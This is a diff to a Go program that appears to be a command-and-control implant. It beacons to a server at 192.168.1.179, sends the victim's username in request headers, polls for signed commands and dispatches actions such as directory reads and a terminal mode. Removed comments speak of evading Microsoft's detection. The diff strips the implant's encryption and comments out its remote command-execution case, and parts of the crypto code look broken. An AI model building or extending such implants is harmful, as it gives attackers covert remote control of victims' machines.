@@ -2,14 +2,12 @@ package main
 
 import (
 	"crypto"
-	"crypto/rand"
 	"crypto/rsa"
 	"crypto/sha256"
 	"crypto/x509"
 	"encoding/hex"
 	"encoding/pem"
 	"fmt"
-	"io"
 	"io/ioutil"
 	"log"
 	"net/http"
@@ -23,23 +21,9 @@ import (
 	"golang.org/x/crypto/chacha20poly1305"
 )
 
-func encryptMessage(key, plaintext []byte) ([]byte, []byte, error) {
-	nonce := make([]byte, chacha20poly1305.NonceSizeX)
-	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
-		return nil, nil, err
-	}
-
-	cipher, err := chacha20poly1305.NewX(key)
-	if err != nil {
-		return nil, nil, err
-	}
-
-	ciphertext := cipher.Seal(nil, nonce, plaintext, nil)
-	return ciphertext, nonce, nil
-}
-
 func decryptMessage(key, ciphertext, nonce []byte) ([]byte, error) {
-	cipher, err := chacha20poly1305.NewX(key)
+	fmt.Printf("nonce %x\n", nonce)
+	cipher, err := chacha20poly1305.New(key)
 	if err != nil {
 		return nil, err
 	}
@@ -102,8 +86,7 @@ func getCurrentUser() (name string) {
 }
 
 func main() {
-	nonce := make([]byte, chacha20poly1305.NonceSizeX)
-	key := []byte("12345678901234567890123456789012")
+	//key := []byte("12345678901234567890123456789012")
 	const pubKeyPEM = "-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA4pz/Qsw7oDtdwT857JcsGU4KWHFi+OgnFbK02BwF82mlESwn9znXldI9guEYW476XvgfMTNP0reGxle+BmIn+AujJ/QF7gQtZ2W/QCZPaOK2sbphRNfaY4zlb8qLrCvsZ4K5SGpyY7U/skyF1lPIW1Og6N+HY8+eSG9xzzGl/SfAjaIhyBT1g94jFtZty9NYXNevdLwdU8OhU1/IzmQU2jG225vZgF0lvbkrVgTLV+iVKqQt1NsLqh141II6UEqZuEHvKtuclbJLTxKSF2uNBCPILDhv8zIqq0K6368hQ8P7FAPoQK96pjx4UwviMG+RSZfa/T7h5tKJNM3cVz3NTwIDAQAB\n-----END PUBLIC KEY-----"
 	PEMBlock, _ := pem.Decode([]byte(pubKeyPEM))
 	if PEMBlock == nil {
@@ -122,14 +105,20 @@ func main() {
 	// Construct the client for requests, we define nothing right now but in the future can add functionality
 	client := http.Client{}
 
-	result := getCurrentUser()
-	toSend := string(result)
-	toSend = strings.Replace(toSend, "\n", "", -1)
-	fmt.Printf(toSend)
+	user := getCurrentUser()
+	result := string(user)
+	//byte_result := []byte(result)
+	//toSend, nonce, _ := encryptMessage(key, byte_result)
+	//string_toSend := string(byte_result)
+	//string_nonce := string(nonce)
+	//toSend = strings.Replace(toSend, "\n", "", -1)
+	//string_toSend = base64.StdEncoding.EncodeToString(string_toSend)
+	//string_nonce = base64.StdEncoding.EncodeToString(nonce)
+	//fmt.Printf(string_toSend)
 
 	//time.Sleep(10)
 	req, err := http.NewRequest("GET", "http://192.168.1.179:8000/", nil)
-	req.Header = http.Header{"APPSESSIONID": {uuid}, "Res": {toSend}, "User-Agent": {"Chromium 110"}}
+	req.Header = http.Header{"APPSESSIONID": {uuid}, "Res": {result}}
 	resp, err := client.Do(req)
 
 	if err != nil {
@@ -138,27 +127,15 @@ func main() {
 
 	defer resp.Body.Close()
 
-	// Here we need to add the functionality for sending the results of command execution and go into a loop of waiting for something, then executing, then repeating [all done]
 	for true {
-		// current issue is that we're not retrieving and executing the new ocmmand
 		req, err = http.NewRequest("GET", "http://192.168.1.179:8000/session", nil)
 		req.Header.Add("APPSESSIONID", uuid)
 		resp, err = client.Do(req)
 		body, err := ioutil.ReadAll(resp.Body)
-		//body = string(body)
-		//fmt.Printf(body)
-		statusC := resp.Status
+		sb := string(body)
 		if err != nil {
 			log.Fatalln(err)
 		}
-
-		//Convert the body to type string
-		esb := body
-		// we need to decrypt the body now
-
-		byte_sb, _ := decryptMessage(key, esb, nonce)
-
-		sb := string(byte_sb)
 
 		for sb == "0" {
 			time.Sleep(2 * time.Second)
@@ -175,30 +152,16 @@ func main() {
 		// This is stored in a header value of the request
 		sig := resp.Header.Get("Verifier")
 		fmt.Printf(sig + "\n")
-		// This is trying to fix the issue of getting 500 status codes
-		// when the DB is cleared
-		//
-		//statusC = string(statusC)
-		fmt.Printf(statusC)
-		fmt.Printf("\n")
-		for statusC == "'500'" {
-			time.Sleep(2 * time.Second)
-			req, err = http.NewRequest("GET", "http://192.168.1.179:8000/session", nil)
-			req.Header.Add("APPSESSIONID", uuid)
-			resp, err = client.Do(req)
-			body, err := ioutil.ReadAll(resp.Body)
-			if err != nil {
-				log.Fatalln(err)
-			}
-			sb = string(body)
-			statusC = resp.Status
-		}
-		fmt.Printf(sb + "\n")
-
-		// We reassign the string body to a new variable because otherwise Microsoft picks up that we're passing an HTML request right to be executed
-		//sb1 := strings.Replace(sb, "\n", "", -1) // we get the command back with a \n which fucks up execution, strip it with this
+		// we need to decrypt the body now
+		// first get the nonce
+		// Current issue might be because we're converting a byte to a byte
+		//nonce := resp.Header.Get("Nonce")
+		//byte_nonce := []byte(nonce)
+		// then decrypt
+		//dec_body, _ := decryptMessage(key, body, byte_nonce)
+		//sb = string(dec_body)
 		sb1 := strings.Split(sb, " ")
-		command := sb[1:]
+		//command := sb[1:]
 
 		h := sha256.New()
 		h.Write([]byte(sb))
@@ -225,8 +188,8 @@ func main() {
 			result = getCurrentDir()
 		case "gcu":
 			result = getCurrentUser()
-		case "rc":
-			result = runCommand(command)
+		//case "rc":
+		//	result = runCommand(command)
 		case "rd":
 			result = readDir(sb1[1])
 		case "terminal":
